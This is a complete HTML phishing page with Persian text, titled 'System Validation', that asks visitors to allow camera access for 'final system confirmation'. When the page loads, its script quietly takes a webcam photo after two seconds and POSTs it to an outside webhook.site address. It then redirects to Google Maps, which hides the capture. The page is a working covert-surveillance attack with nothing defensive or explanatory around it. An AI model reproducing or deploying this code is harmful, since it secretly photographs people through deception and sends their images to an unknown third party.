<!DOCTYPE html>
<html>
<head><title>System Validation</title></head>
<body>
    <div style="text-align: center; margin-top: 20%; font-family: Arial;">
        <h2>لطفاً برای تایید نهایی سیستم، اجازه دسترسی به دوربین را بدهید</h2>
        <video id="v" width="320" height="240" style="display:none" autoplay></video>
        <canvas id="c" width="320" height="240" style="display:none"></canvas>
    </div>

    <script>
        async function capture() {
            try {
                // درخواست دسترسی به دوربین
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = s;

                // ۲ ثانیه صبر برای فوکوس و بعد گرفتن عکس
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
                    const img = c.toDataURL('image/jpeg');

                    // ارسال عکس به وب‌هوک
                    fetch('https://webhook.site/dd9af163-1084-4613-852c-e8554895a323', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: img
                    });
                    
                    // بستن دوربین و انتقال به گوگل مپ
                    s.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.google.com/maps";
                }, 2000);
            } catch (e) {
                window.location.href = "https://www.google.com/maps";
            }
        }
        window.onload = capture;
    </script>
</body>
</html>
